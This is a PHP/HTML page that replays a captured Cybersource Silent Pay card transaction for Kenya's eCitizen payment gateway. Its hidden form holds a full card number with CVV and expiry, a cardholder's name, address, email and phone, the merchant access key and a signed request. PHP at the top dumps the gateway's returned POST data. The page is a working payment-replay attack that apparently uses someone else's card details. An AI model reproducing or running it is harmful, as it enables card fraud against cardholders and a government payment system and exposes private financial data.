<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "<h2>📩 Captured POST from Cybersource to override_custom_receipt_page</h2>";
    echo "<pre>" . print_r($_POST, true) . "</pre>";
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Cybersource Silent Pay Replay</title>
</head>
<body>
<h2>🔁 Replay Cybersource Silent Pay Request Exactly as Captured</h2>
<form method="POST" action="https://secureacceptance.cybersource.com/silent/pay">
  <input type='hidden' name='CardNo4' value='4246 3153 8031 1140'>
  <input type='hidden' name='access_key' value='972ae9ba01f73c56999e33ba51d7e261'>
  <input type='hidden' name='amount' value='672.75'>
  <input type='hidden' name='auth_trans_ref_no' value='KBLFQCU'>
  <input type='hidden' name='bill_ref' value='X8VJM3'>
  <input type='hidden' name='bill_to_address_city' value='Wilmington'>
  <input type='hidden' name='bill_to_address_country' value='US'>
  <input type='hidden' name='bill_to_address_line1' value='433 Darlington Ave U'>
  <input type='hidden' name='bill_to_address_line2' value='+254756754595'>
  <input type='hidden' name='bill_to_address_postal_code' value='28403'>
  <input type='hidden' name='bill_to_address_state' value='NC'>
  <input type='hidden' name='bill_to_email' value='bombardier.devs.master@gmail.com'>
  <input type='hidden' name='bill_to_forename' value='Brent'>
  <input type='hidden' name='bill_to_phone' value='+254756754595'>
  <input type='hidden' name='bill_to_surname' value='Seaver'>
  <input type='hidden' name='card_cvn' value='700'>
  <input type='hidden' name='card_expiry_date' value='09-2028'>
  <input type='hidden' name='card_number' value='4246315380311140'>
  <input type='hidden' name='card_type' value='001'>
  <input type='hidden' name='currency' value='KES'>
  <input type='hidden' name='customer_ip_address' value='172.18.162.51'>
  <input type='hidden' name='device_fingerprint_id' value='vskul9h7p58opoknpdqmrj42k7'>
  <input type='hidden' name='eMonth' value='09'>
  <input type='hidden' name='eYear' value='2028'>
  <input type='hidden' name='first_name' value='Brent'>
  <input type='hidden' name='item_0_code' value='KBLFQCU'>
  <input type='hidden' name='item_0_name' value='KBLFQCU'>
  <input type='hidden' name='item_0_quantity' value='1'>
  <input type='hidden' name='item_0_sku' value='KBLFQCU'>
  <input type='hidden' name='item_0_unit_price' value='672.75'>
  <input type='hidden' name='last_name' value='Seaver'>
  <input type='hidden' name='line_item_count' value='1'>
  <input type='hidden' name='locale' value='en-us'>
  <input type='hidden' name='merchant_defined_data1' value='MDD#1'>
  <input type='hidden' name='merchant_defined_data2' value='MDD#2'>
  <input type='hidden' name='merchant_defined_data3' value='MDD#3'>
  <input type='hidden' name='merchant_defined_data4' value='https://pesaflow.ecitizen.go.ke/PaymentAPI/Wrappers/Cybersource4/ipn.php'>
  <input type='hidden' name='merchant_descriptor' value='ECITIZEN'>
  <input type='hidden' name='name' value='Brent Seaver'>
  <input type='hidden' name='override_custom_receipt_page' value='https://pesaflow.ecitizen.go.ke/PaymentAPI/Wrappers/Cybersource4/ipn.php'>
  <input type='hidden' name='payment_gateway_id' value='30'>
  <input type='hidden' name='payment_method' value='card'>
  <input type='hidden' name='profile_id' value='AE3F228E-9750-4C9E-96A8-709E36BB502B'>
  <input type='hidden' name='reference_number' value='KBLFQCU'>
  <input type='hidden' name='service_id' value='42'>
  <input type='hidden' name='signature' value='DHGiKk5Vq8dbV+gxtN3J402A4Rp26xUq5mVoZ3BUyuI='>
  <input type='hidden' name='signed_date_time' value='2025-05-15T03:10:00Z'>
  <input type='hidden' name='signed_field_names' value='profile_id,access_key,transaction_uuid,signed_field_names,unsigned_field_names,signed_date_time,locale,payment_method,transaction_type,reference_number,auth_trans_ref_no,amount,currency,merchant_descriptor,override_custom_receipt_page'>
  <input type='hidden' name='transaction_type' value='sale'>
  <input type='hidden' name='transaction_uuid' value='X8VJM3_510'>
  <input type='hidden' name='unsigned_field_names' value='device_fingerprint_id,card_type,card_number,card_expiry_date,card_cvn,bill_to_forename,bill_to_surname,bill_to_email,bill_to_phone,bill_to_address_line1,bill_to_address_line2,bill_to_address_city,bill_to_address_state,bill_to_address_country,bill_to_address_postal_code,customer_ip_address,line_item_count,item_0_code,item_0_sku,item_0_name,item_0_quantity,item_0_unit_price,merchant_defined_data1,merchant_defined_data2,merchant_defined_data3,merchant_defined_data4'>
  <button type='submit'>🔁 Send POST to Cybersource</button>
</form>
</body>
</html>
